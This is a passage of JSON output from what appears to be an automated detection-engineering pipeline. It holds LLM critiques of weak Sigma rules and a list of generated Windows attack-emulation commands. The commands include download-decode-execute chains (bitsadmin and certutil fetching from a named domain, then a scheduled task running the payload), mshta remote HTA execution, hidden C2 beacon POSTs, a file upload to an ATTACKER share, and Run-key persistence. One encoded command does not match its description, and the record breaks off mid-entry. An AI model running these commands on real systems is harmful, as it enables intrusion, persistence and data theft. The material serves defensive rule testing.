          "Lacks specificity and relies on a vague keyword not tied to actual TTP indicators",
          "Tags and TTP mapping are incomplete or generic (e.g., 'attack.unknown', 'technique_name: Process Injection' without MITRE ID)"
        ],
        "suggestions": [
          "Refine detection logic using known command-line patterns or arguments associated with process injection (e.g., usage of 'rundll32', 'regsvr32', or specific DLL loading techniques)",
          "Incorporate multiple detection conditions (e.g., parent-child process anomalies, use of native tools)",
          "Map rule to MITRE ATT&CK ID (e.g., T1055) for better completeness and correlation",
          "Add context-based filtering to reduce false positives (e.g., exclude known administrative tools or signed binaries)",
          "Re-test rule against confirmed attack data and update based on findings"
        ],
        "metrics": {
          "accuracy": 0.3,
          "completeness": 0.5,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Detection: Application Layer Protocol",
        "rule_id": "e53c1098-cfdb-4a6b-986e-fccac0fd40c6",
        "quality_score": 0.55,
        "status": "fail",
        "strengths": [
          "The rule is simple and focused on process creation events on Windows, which is a common attack vector",
          "The performance of the query is efficient, with a query time of 433ms, indicating it is not overly resource-intensive",
          "The rule includes metadata such as false positives and detection level, which supports operational clarity"
        ],
        "weaknesses": [
          "The rule failed to detect any real-world events (0/0), indicating poor detection coverage",
          "The detection logic relies solely on the presence of the word 'suspicious' in the command line, which is overly generic and likely not representative of actual TTP behavior",
          "The TTP ID and technique name are marked as 'unknown', indicating incomplete mapping to known threats",
          "The rule uses a fallback generation method, suggesting it was not derived from high-fidelity threat intelligence"
        ],
        "suggestions": [
          "Revise the detection logic to include specific command-line patterns, tools, or behaviors associated with the Application Layer Protocol technique",
          "Map the rule to a valid MITRE ATT&CK technique ID and ensure alignment with known TTPs",
          "Use real attack data or threat intelligence to refine the detection logic instead of relying on generic keywords",
          "Test the updated rule against historical data or attack simulations to validate detection capability",
          "Consider enriching the rule with additional context such as parent-child process relationships or network indicators if applicable"
        ],
        "metrics": {
          "accuracy": 0.3,
          "completeness": 0.6,
          "efficiency": 0.8,
          "maintainability": 0.5
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Detection: Remote Access Tool",
        "rule_id": "2faeeff8-7611-482b-91ef-61a952773ba9",
        "quality_score": 0.5,
        "status": "fail",
        "strengths": [
          "The rule targets process creation events on Windows, which is a relevant data source for detecting remote access tools",
          "The rule has a defined false positive consideration, acknowledging potential legitimate administrative activity",
          "The query execution time is reasonable (429ms), indicating acceptable performance for most environments"
        ],
        "weaknesses": [
          "The rule failed to detect the attack in real-world verification (0 events found), indicating poor detection coverage",
          "The detection logic relies on 'CommandLine|contains: suspicious', which is overly vague and likely to miss actual malicious activity",
          "The TTP ID and technique ID are marked as 'unknown', reducing traceability and alignment with known threat intelligence",
          "No specific indicators (e.g., known M2RAT command lines, file paths, or parent processes) are included, increasing risk of both false negatives and false positives"
        ],
        "suggestions": [
          "Refine the detection logic using specific command-line patterns, file paths, or parent-child process relationships associated with M2RAT",
          "Incorporate additional telemetry such as network connections or registry modifications if available",
          "Align the rule with a known MITRE ATT&CK technique (e.g., T1071, T1219) and update 'tags' and 'technique_name' accordingly",
          "Conduct further testing with real or simulated M2RAT activity to validate detection capability",
          "Improve completeness by adding fields like 'ParentImage', 'User', or 'CommandLine' with specific IOCs"
        ],
        "metrics": {
          "accuracy": 0.3,
          "completeness": 0.4,
          "efficiency": 0.8,
          "maintainability": 0.5
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Detection: Command and Scripting Interpreter",
        "rule_id": "eae8a98d-644c-4167-b79e-55c25cb83abf",
        "quality_score": 0.525,
        "status": "fail",
        "strengths": [
          "The rule targets process creation events on Windows, which is a relevant data source for detecting command and scripting interpreter activity",
          "The rule structure follows Sigma format correctly and includes basic metadata like description, logsource, and detection conditions",
          "Performance appears acceptable with a query time of 445ms, indicating efficient execution in the SIEM"
        ],
        "weaknesses": [
          "The detection logic is overly vague, relying on 'CommandLine|contains: suspicious' which is unlikely to match real malicious activity",
          "The rule failed to detect any events in real-world verification (0 out of 0), indicating poor efficacy",
          "The TTP ID and technique name are generic or 'unknown', reducing alignment with known adversary behavior",
          "No specific indicators or patterns tied to actual command-line interpreter attacks (e.g., powershell, cmd, wscript) are included"
        ],
        "suggestions": [
          "Revise the detection logic to include specific command-line patterns associated with scripting interpreters (e.g., 'powershell', 'cmd /c', 'wscript', 'cscript', 'sh -c')",
          "Use regular expressions or multiple keyword selections to improve precision and coverage",
          "Align the rule with a valid MITRE ATT&CK technique ID (e.g., T1059) and update tags accordingly",
          "Include negative conditions to filter out common benign activity and reduce false positives",
          "Re-test the updated rule against historical or simulated attack data to verify detection capability"
        ],
        "metrics": {
          "accuracy": 0.2,
          "completeness": 0.5,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Detection: Obfuscated Files or Information",
        "rule_id": "71b6ac97-169a-46e9-ad41-7105bb53f1d5",
        "quality_score": 0.55,
        "status": "fail",
        "strengths": [
          "The rule targets process creation events on Windows, which is a relevant data source for detecting obfuscated command-line activity",
          "The rule structure follows Sigma format correctly and includes basic metadata like description, logsource, and detection logic",
          "Performance appears efficient with a query time of 433ms, indicating acceptable execution speed in the SIEM"
        ],
        "weaknesses": [
          "The rule failed to detect any real-world events (0/0), indicating poor detection coverage against the target TTP",
          "The detection logic is overly simplistic, relying only on 'CommandLine|contains: suspicious', which is vague and unlikely to match real obfuscation patterns",
          "The use of the term 'suspicious' as a literal string match will miss actual obfuscation techniques (e.g., encoded commands, string manipulation)",
          "The TTP ID and technique ID are marked as 'unknown', indicating incomplete mapping to MITRE ATT&CK",
          "No specific indicators or known obfuscation patterns (e.g., -enc, -e, wscript, certutil) are included, reducing effectiveness"
        ],
        "suggestions": [
          "Revise the detection logic to include known obfuscation patterns such as base64 encoding flags (-enc), script execution keywords, or common obfuscation tools",
          "Use regular expressions or multi-term selections to capture variations of obfuscated commands",
          "Map the rule accurately to MITRE ATT&CK technique T1027 (Obfuscated Files or Information) with correct IDs",
          "Add context-based conditions such as parent-child process anomalies or rare command-line arguments",
          "Test and validate the updated rule against real attack datasets (e.g., Atomic Red Team) to improve detection confidence"
        ],
        "metrics": {
          "accuracy": 0.3,
          "completeness": 0.6,
          "efficiency": 0.8,
          "maintainability": 0.5
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Detection: Exfiltration Over C2 Channel",
        "rule_id": "eee6f543-c79c-4a6d-9b0c-f9e7a50d60b6",
        "quality_score": 0.5,
        "status": "fail",
        "strengths": [
          "The rule targets process creation events on Windows, which is a relevant data source for detecting malicious activity",
          "The performance of the query is efficient, with a query time of 423ms, indicating it is not overly resource-intensive"
        ],
        "weaknesses": [
          "The rule failed to detect any real-world events (0/0), indicating poor detection coverage",
          "The detection logic relies on a generic 'suspicious' string in the command line, which is vague and likely insufficient to capture actual exfiltration behavior",
          "The TTP ID and technique information are marked as 'unknown', reducing confidence in alignment with real adversary behavior",
          "No specific IOCs or behavioral patterns tied to the TTP are included in the rule"
        ],
        "suggestions": [
          "Improve detection logic by incorporating specific command-line patterns, tools, or arguments commonly used in exfiltration (e.g., certutil, bitsadmin, PowerShell with encoding)",
          "Add specific indicators or behavioral artifacts from known exfiltration techniques (e.g., data compression, network connections after file access)",
          "Refine the rule to reduce ambiguity by avoiding generic terms like 'suspicious' and instead using concrete, evidence-based patterns",
          "Update tags and TTP references with accurate MITRE ATT&CK IDs (e.g., T1041) to improve traceability and coverage assessment",
          "Conduct additional testing with real or simulated attack data to validate detection capability and tune the rule accordingly"
        ],
        "metrics": {
          "accuracy": 0.3,
          "completeness": 0.4,
          "efficiency": 0.8,
          "maintainability": 0.5
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Detection: Exploit Public-Facing Application",
        "rule_id": "92438915-a525-4317-9f42-4caf39a5c13b",
        "quality_score": 0.475,
        "status": "fail",
        "strengths": [
          "The rule is simple and lightweight, which contributes to good query performance",
          "The log source is clearly defined (Windows process creation), which helps with context"
        ],
        "weaknesses": [
          "The rule failed to detect the target attack technique in real-world verification (0 events found), indicating poor detection coverage",
          "The detection logic is overly generic (e.g., CommandLine contains 'suspicious'), which increases the risk of false positives and reduces precision",
          "The rule lacks specific indicators or behavioral patterns tied to the 'Exploit Public-Facing Application' technique",
          "Tags and TTP mapping are incomplete or generic (e.g., 'attack.unknown', 'technique_name' not mapped to real MITRE ID)"
        ],
        "suggestions": [
          "Revise the detection logic to include specific command-line patterns, file paths, or arguments commonly associated with exploiting public-facing applications (e.g., web server binaries, exploit payloads)",
          "Incorporate additional detection fields such as ParentProcess, Image, or User context to improve accuracy",
          "Map the rule to a valid MITRE ATT&CK ID (e.g., T1190) and update tags accordingly",
          "Test and validate the rule against real or simulated attack data to ensure it detects the intended behavior",
          "Avoid generic keywords like 'suspicious' that do not reflect actual threat intelligence"
        ],
        "metrics": {
          "accuracy": 0.2,
          "completeness": 0.4,
          "efficiency": 0.8,
          "maintainability": 0.5
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Detection: Archive Collected Data",
        "rule_id": "0e60fca5-21cb-4d5a-bccf-2362f1b3b9cd",
        "quality_score": 0.55,
        "status": "fail",
        "strengths": [
          "Rule is simple and focused on process creation events on Windows, which is a common telemetry source for this type of activity",
          "Includes a clear false positive note indicating awareness of potential benign triggers",
          "Efficient query execution time (469ms) suggests good performance characteristics"
        ],
        "weaknesses": [
          "Rule failed to detect any real-world events (0/0) for the target TTP, indicating poor detection coverage",
          "Detection logic relies on 'CommandLine|contains: suspicious' which is overly generic and not tied to any known adversary behavior",
          "The use of the term 'suspicious' in the command line is vague and likely not present in actual malware or attacker commands",
          "Lacks specificity in TTP mapping (attack.id and technique id are 'unknown')",
          "No observable indicators (IOCs) or known tooling patterns tied to 'Archive Collected Data' such as 7zip, rar, tar usage with specific flags"
        ],
        "suggestions": [
          "Revise detection logic to include actual command-line patterns associated with archiving tools (e.g., '7z a', 'zip -r', 'tar -cf')",
          "Map the rule to a valid MITRE ATT&CK technique ID (e.g., T1560 - Archive Collected Data) with correct 'attack.technique' and 'attack.tactic' fields",
          "Add specific process names (e.g., '7z.exe', 'zip.exe', 'rar.exe') to the selection criteria to improve precision",
          "Validate the rule against real or simulated attack data and retest to ensure detection capability",
          "Improve completeness by including additional context such as parent-child process relationships or file output paths commonly used in data staging"
        ],
        "metrics": {
          "accuracy": 0.3,
          "completeness": 0.5,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Detection: Screen Capture",
        "rule_id": "fca1530f-2c2c-4381-824e-1fb0381efa74",
        "quality_score": 0.525,
        "status": "fail",
        "strengths": [
          "The rule is simple and focused on process creation events, which is a valid approach for detecting screen capture tools",
          "The performance of the query is efficient, with a low execution time (455ms), indicating it won't strain the SIEM"
        ],
        "weaknesses": [
          "The rule failed to detect any real-world events (0/0), indicating poor detection coverage",
          "The detection logic relies on a generic 'CommandLine|contains: suspicious' pattern, which is vague and likely ineffective",
          "The TTP ID and technique ID are marked as 'unknown', reducing traceability to known threat behavior",
          "The rule lacks specificity \u2014 no known screen capture tools, commands, or indicators are referenced",
          "No actual TTP details (e.g., tools, command lines) were used, increasing risk of hallucination or generic matching"
        ],
        "suggestions": [
          "Revise the detection logic to include known screen capture tools (e.g., 'screenshot', 'SnippingTool', 'Greenshot', 'Lightshot') or specific command-line patterns",
          "Use real TTP data from verified attacks (e.g., MITRE ATT&CK T1113) to align the rule with actual adversary behavior",
          "Improve specificity by adding multiple selection conditions (e.g., parent-child process relationships, image file writes)",
          "Conduct another verification after updates to confirm detection capability",
          "Update tags and metadata to use standard ATT&CK identifiers (e.g., T1113 for Screen Capture)"
        ],
        "metrics": {
          "accuracy": 0.2,
          "completeness": 0.5,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Detection: Registry Run Keys",
        "rule_id": "c5a093f4-4df7-4856-8ad7-a4e56434f887",
        "quality_score": 0.55,
        "status": "fail",
        "strengths": [
          "The rule targets a known persistence mechanism (Registry Run Keys), which is a valid security concern",
          "The performance of the query is efficient, with a query time of 429.0ms, indicating acceptable execution speed",
          "The rule is structured with standard Sigma format and includes metadata like false positives and detection level"
        ],
        "weaknesses": [
          "The rule failed to detect any real-world events (0/0), indicating poor detection coverage",
          "The detection logic relies on 'CommandLine|contains: suspicious', which is overly vague and likely not aligned with actual TTP behavior",
          "The use of the term 'suspicious' in the command line is ambiguous and not based on specific indicators from the TTP",
          "The TTP has an unknown MITRE ID and empty tactic field, reducing confidence in alignment",
          "No specific IOCs or behavioral patterns from the attack are reflected in the rule"
        ],
        "suggestions": [
          "Revise the detection logic to include specific command-line patterns or registry paths associated with Registry Run Keys (e.g., referencing \\Software\\Microsoft\\Windows\\CurrentVersion\\Run)",
          "Incorporate known legitimate software exclusions to reduce false positives",
          "Align the rule with a valid MITRE ATT&CK technique (e.g., T1547.001) and update tags accordingly",
          "Use real attack data or threat intelligence to refine selection criteria instead of generic terms like 'suspicious'",
          "Validate the updated rule against historical attack data to confirm detection capability"
        ],
        "metrics": {
          "accuracy": 0.3,
          "completeness": 0.5,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      }
    ],
    "feedback": {
      "timestamp": "2025-12-21T21:08:04.651079",
      "source_agent": "7e27d14c-f90b-48c5-a0b8-cb7051f90aa7",
      "target_agent": "rulegen",
      "average_quality_score": 0.596,
      "total_rules_evaluated": 52,
      "improvements_needed": [
        {
          "metric": "quality",
          "current_value": 0.5961538461538464,
          "target_value": 0.85,
          "suggestion": "Improve overall rule quality"
        }
      ],
      "common_issues": [
        "The rule failed to detect any real-world events (0/0), indicating poor detection coverage",
        "Rule failed to detect any real-world events (0/0), indicating poor detection coverage",
        "Rule failed to detect the actual attack in real-world verification (0 events found), indicating poor detection coverage",
        "Failed to detect the attack in real-world verification (0 events found)",
        "Rule failed to detect the attack in real-world verification (0 events found), indicating poor detection coverage"
      ],
      "actionable_suggestions": [
        "Refactor the rule to detect actual indicators of shared memory abuse, such as specific APIs (e.g., CreateFileMapping, MapViewOfFile) via Sysmon Event ID 8 (CreateRemoteThread) or ETW logging.",
        "Use process lineage and parent-child relationships to identify suspicious process creation involving known shared memory patterns.",
        "Add filtering to exclude known benign processes (e.g., explorer.exe, chrome.exe) when they create shared memory sections.",
        "Incorporate additional context such as command-line arguments with suspicious handles or named sections (e.g., 'Global\\\\', 'Session\\\\') commonly used in cross-process injection.",
        "Validate the updated rule against real attack data or emulation plans to ensure detection efficacy."
      ]
    }
  },
  "attacks": [
    {
      "id": "83bdc967-fef3-4983-9894-10eaaf0b4a05",
      "ttp_id": "unknown",
      "technique_id": "Txxxx",
      "technique_name": "Shared Memory",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"[System.IO.MemoryMappedFiles.MemoryMappedFile]::CreateOrOpen('TestSharedMem',1024) | Out-Null\"",
      "description": "Creates a named shared memory section called 'TestSharedMem' with a size of 1024 bytes that can be accessed by other processes on the system.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "A memory\u2011mapped file object is created in the OS kernel. No visible files are written to disk; the section persists until the PowerShell process exits.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:30:28.229772",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "f721c42a-7a09-40c7-8fc1-2b1d02e02b38",
      "ttp_id": "unknown",
      "technique_id": "Txxxx",
      "technique_name": "Shared Memory",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -EncodedCommand \"W1N5c3RlbS5JTy5NZW1vcnlNYXBwaW5nRmlsZXMuTWVtb3J5TWFwcGluZ0ZpbGVdOjpDcmVhdGVPck9wZW4oJ1Rlc3RTaGFyZWREZW1jJywxMDI0KSB8IE91dC1Ob3JtYWw=\"",
      "description": "Encoded version of the basic shared memory creation command. The Base64 string is generated from the UTF\u201116LE representation of the PowerShell script that creates the 'TestSharedMem' section.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "When decoded and executed, the command creates the same 1024\u2011byte named shared memory section as the basic example, without emitting any console output.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:30:28.229772",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "3bcb9e12-9913-4a71-bca4-19066df0b27d",
      "ttp_id": "unknown",
      "technique_id": "Txxxx",
      "technique_name": "Shared Memory",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Add-Type -MemberDefinition '[DllImport(\\\"kernel32.dll\\\")] public static extern IntPtr CreateFileMapping(IntPtr hFile, IntPtr lpAttributes, uint flProtect, uint dwMaximumSizeHigh, uint dwMaximumSizeLow, string lpName); [DllImport(\\\"kernel32.dll\\\")] public static extern IntPtr MapViewOfFile(IntPtr hFileMappingObject, uint dwDesiredAccess, uint dwFileOffsetHigh, uint dwFileOffsetLow, uint dwNumberOfBytesToMap);' -Name 'NativeMethods' -Namespace 'Win32'; $hMap = [Win32.NativeMethods]::CreateFileMapping(-1,0,0x04,0,1024,'AdvancedSharedMem'); $ptr = [Win32.NativeMethods]::MapViewOfFile($hMap,0x0004,0,0,1024);\"",
      "description": "Uses P/Invoke to call the native Windows API functions CreateFileMapping and MapViewOfFile, creating a named shared memory section 'AdvancedSharedMem' and mapping it into the current process address space.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "A 1024\u2011byte shared memory segment named 'AdvancedSharedMem' is allocated in kernel space and a view is mapped into the PowerShell process. The command produces no visible output but leaves a handle that other processes can open via the same name.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:30:28.229772",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "d477b010-d225-4ab7-a1a0-f39b773e7687",
      "ttp_id": "unknown",
      "technique_id": "T1027.003",
      "technique_name": "Steganography",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil -decode \"%TEMP%\\stego.jpg\" \"%TEMP%\\payload.bin\"",
      "description": "Uses the built\u2011in certutil utility to decode hidden data embedded in a JPEG file (stego.jpg) using the default base64 decoder, writing the extracted payload to payload.bin.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "The JPEG file is read, any base64\u2011encoded steganographic content is decoded, and the resulting binary is saved to %TEMP%\\payload.bin. No execution of the payload occurs.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:30:29.248857",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "71c1fc33-9619-4b68-a707-715e243e012e",
      "ttp_id": "unknown",
      "technique_id": "T1027.003",
      "technique_name": "Steganography",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"$data=[IO.File]::ReadAllBytes('%TEMP%\\stego.jpg');$key=0x5A;for($i=0;$i -lt $data.Length;$i++){$data[$i] = $data[$i] -bxor $key};[IO.File]::WriteAllBytes('%TEMP%\\decoded.bin',$data);Start-Process -FilePath '%TEMP%\\decoded.bin' -WindowStyle Hidden\"",
      "description": "PowerShell reads the JPEG file, applies a simple XOR with key 0x5A to reveal the hidden payload, writes the decoded binary to decoded.bin, and launches it silently.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "The XOR operation removes the steganographic obfuscation, producing a runnable binary which is then executed in a hidden window. The command demonstrates decoding and execution of steganographically hidden code.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:30:29.248857",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "53e83274-4c20-4a5a-9ba1-986f6c6581ab",
      "ttp_id": "unknown",
      "technique_id": "T1027.003",
      "technique_name": "Steganography",
      "tactic": "execution",
      "platform": "windows",
      "command": "bitsadmin /transfer stegoJob /download /priority normal \"http://wallup.net/stego.jpg\" \"%TEMP%\\stego.jpg\" & certutil -decode \"%TEMP%\\stego.jpg\" \"%TEMP%\\payload.exe\" & schtasks /Create /SC ONCE /TN \"StegoTask\" /TR \"%TEMP%\\payload.exe\" /ST 00:00 /F",
      "description": "Downloads a JPEG containing hidden data from the malicious domain wallup.net using bitsadmin, decodes the embedded payload with certutil, and schedules the payload to run immediately via a one\u2011time scheduled task.",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "The JPEG is fetched from wallup.net, the hidden payload is extracted to payload.exe, and a scheduled task named StegoTask is created to execute the payload at the next minute. This chain shows full download\u2011decode\u2011execution of steganographic malware.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:30:29.248857",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "5b1d30e9-d26f-48ff-aea0-a2bccb0431c6",
      "ttp_id": "unknown",
      "technique_id": "T1218.005",
      "technique_name": "MSHTA",
      "tactic": "execution",
      "platform": "windows",
      "command": "mshta.exe http://example.com/malicious.hta",
      "description": "Basic usage of mshta to execute a remote HTA file. The URL points to a benign test HTA that displays a message box.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Mshta attempts to download the HTA from the provided URL and, if successful, runs the script which shows a simple alert dialog.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:30:30.303998",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "6e97d35e-b3d4-4f22-b060-adfcf8781b19",
      "ttp_id": "unknown",
      "technique_id": "T1218.005",
      "technique_name": "MSHTA",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil -urlcache -split -f http://example.com/malicious.hta %TEMP%\\payload.hta && mshta.exe %TEMP%\\payload.hta",
      "description": "Intermediate variant: uses the built\u2011in certutil.exe to download the HTA to the temporary directory, then executes it with mshta. This mimics a common \u201cdownload\u2011then\u2011execute\u201d pattern.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Certutil fetches the HTA file and stores it as %TEMP%\\payload.hta. The subsequent mshta.exe call runs the downloaded HTA, which displays a benign alert.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:30:30.303998",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "2602dd42-d1b1-487d-b20c-8ed1fbbda429",
      "ttp_id": "unknown",
      "technique_id": "T1218.005",
      "technique_name": "MSHTA",
      "tactic": "execution",
      "platform": "windows",
      "command": "mshta.exe \"data:text/html,<script>alert('Advanced Test');</script>\"",
      "description": "Advanced variant: runs mshta with an inline data URL containing a small HTML/JavaScript payload. No external network request is required, avoiding reliance on internet connectivity.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Mshta parses the data URL and executes the embedded script, resulting in a simple message box with the text \u201cAdvanced Test\u201d.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:30:30.303998",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "c448256f-4622-4228-b56b-0ad218feb1d4",
      "ttp_id": "unknown",
      "technique_id": "T1547.001",
      "technique_name": "Autorun Registration",
      "tactic": "execution",
      "platform": "windows",
      "command": "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"TestApp\" /t REG_SZ /d \"C:\\Windows\\System32\\notepad.exe\" /f",
      "description": "Creates a Run registry key under the current user hive to execute Notepad at logon. No admin rights required.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "A new value named 'TestApp' is added to HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run pointing to notepad.exe; the entry persists across reboots.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:30:31.353997",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "5da834c2-9805-456c-86f2-3ce6adbe26cc",
      "ttp_id": "unknown",
      "technique_id": "T1547.001",
      "technique_name": "Autorun Registration",
      "tactic": "execution",
      "platform": "windows",
      "command": "reg add \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"TestApp\" /t REG_SZ /d \"C:\\Windows\\System32\\calc.exe\" /f",
      "description": "Creates a Run registry key under the local machine hive to execute Calculator at system startup. Requires administrative privileges.",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "A new value named 'TestApp' is added to HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run pointing to calc.exe; the entry runs for all users on boot.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:30:31.353997",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "c28e5072-401b-4ff3-8033-5ba88aedc731",
      "ttp_id": "unknown",
      "technique_id": "T1547.001",
      "technique_name": "Autorun Registration",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"New-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'TestApp' -Value 'C:\\Windows\\System32\\calc.exe' -PropertyType String -Force\"",
      "description": "Uses PowerShell to create a Run key in the current user's registry, adding a persistence entry for Calculator. No admin rights required.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "The registry value 'TestApp' is created under HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run with the specified executable path.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:30:31.353997",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "a4f439e2-b71a-483a-a896-893588e49eca",
      "ttp_id": "unknown",
      "technique_id": "T1071.001",
      "technique_name": "Command and Control",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"$wc = New-Object System.Net.WebClient; $wc.UploadString('https://malicious.example.com/log.php','R=benign')\"",
      "description": "Uses PowerShell's .NET WebClient to issue a simple HTTP POST to the M2RAT C2 endpoint with the R parameter containing benign test data.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "A POST request is sent to https://malicious.example.com/log.php; the server would receive the payload R=benign.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:30:32.578933",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "b97da24d-bfce-4823-999d-e1331fbdf8d3",
      "ttp_id": "unknown",
      "technique_id": "T1071.001",
      "technique_name": "Command and Control",
      "tactic": "execution",
      "platform": "windows",
      "command": "curl -X POST -d \"U=sampledata\" https://malicious.example.com/log.php",
      "description": "Leverages the built\u2011in Windows curl binary to POST the U parameter to the M2RAT log.php endpoint.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "curl issues an HTTP POST to the specified URL; the server records the U=sampledata value.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:30:32.578933",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "a77bb3ff-c10a-43a1-832b-91f57548ee7a",
      "ttp_id": "unknown",
      "technique_id": "T1071.001",
      "technique_name": "Command and Control",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -NoProfile -WindowStyle Hidden -Command \"$wc = New-Object System.Net.WebClient; $wc.UploadString('https://malicious.example.com/log.php','U=stealthdata')\"",
      "description": "Runs PowerShell in hidden mode to send a POST request with the U parameter, mimicking a stealthy C2 beacon.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "A background PowerShell process posts U=stealthdata to the C2 endpoint without opening a visible console window.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:30:32.578933",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "a4359573-1984-4e9c-99fd-ea63c1799886",
      "ttp_id": "unknown",
      "technique_id": "T1041",
      "technique_name": "Exfiltration",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil -encode \"%USERPROFILE%\\Documents\\secret.txt\" \"%TEMP%\\secret.b64\"",
      "description": "Base64\u2011encodes a target file (e.g., a document) and writes the encoded output to the temporary directory. This mimics exfiltration via encoding before transfer.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates %TEMP%\\secret.b64 containing the Base64 representation of secret.txt; original file remains unchanged.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:30:33.442861",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "48dac5ca-75e5-44ee-9f0c-0474e28015ba",
      "ttp_id": "unknown",
      "technique_id": "T1041",
      "technique_name": "Exfiltration",
      "tactic": "execution",
      "platform": "windows",
      "command": "bitsadmin /transfer exfilJob /upload \"\\\\ATTACKER\\share\\exfil\" \"%TEMP%\\secret.txt\"",
      "description": "Uses the built\u2011in BITS client to upload a file from the temporary directory to a remote SMB share controlled by the tester, demonstrating data exfiltration over a command\u2011line utility.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Attempts to upload %TEMP%\\secret.txt to the SMB share \\\\ATTACKER\\share\\exfil; if the share is reachable, the file is transferred.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:30:33.442861",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "278262a0-4cdc-43e7-93ce-4fb73b8a21fd",
      "ttp_id": "unknown",
